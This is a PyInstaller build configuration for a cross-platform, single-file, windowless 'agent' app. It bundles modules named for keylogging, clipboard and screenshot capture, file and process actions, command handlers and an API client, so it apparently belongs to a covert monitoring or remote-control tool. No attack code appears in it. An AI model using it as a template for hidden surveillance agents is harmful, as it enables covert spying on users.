"""
PyInstaller configuration for cross-platform builds
"""
from pathlib import Path
from config.settings import APP_NAME

# Project paths
PROJECT_ROOT = Path(__file__).parent.parent
ASSETS_DIR = PROJECT_ROOT / "assets"
ICON_PATH = ASSETS_DIR / "icon.jpg"

# Common PyInstaller settings
COMMON_ARGS = {
    "name": APP_NAME,
    "console": False,  # No console window
    "onefile": True,   # Single executable file
    "noconfirm": True,
    "log_level": "INFO",
}

# Platform-specific settings
PLATFORM_CONFIG = {
    "windows": {
        "distpath": "dist/windows",
        "workpath": "build/windows",
        "icon": str(ICON_PATH) if ICON_PATH.exists() else None,
    },
    "mac": {
        "distpath": "dist/mac",
        "workpath": "build/mac",
        "icon": str(ICON_PATH) if ICON_PATH.exists() else None,
        "osx_bundle_identifier": "com.alisium.agent",
        "target_arch": "universal2",  # Intel + ARM support
    },
    "linux": {
        "distpath": "dist/linux",
        "workpath": "build/linux",
        "icon": str(ICON_PATH) if ICON_PATH.exists() else None,
    },
}

# Hidden imports (modules not automatically detected)
HIDDEN_IMPORTS = [
    "rumps",
    "services.keylogger",
    "services.clipboard",
    "services.screenshot",
    "actions.clipboard",
    "actions.filesystem",
    "actions.keylogger",
    "actions.processes",
    "actions.screenshot",
    "actions.system",
    "app.agent",
    "app.bootstrap",
    "app.command_handlers",
    "core.current_app",
    "storage.identity",
    "api.client",
    "config.settings",
]

# Binaries and data files to include
BINARIES = []
DATAS = [
    (str(ASSETS_DIR), "assets"),
    (str(PROJECT_ROOT / "config"), "config"),
    (str(PROJECT_ROOT / "storage"), "storage"),
]
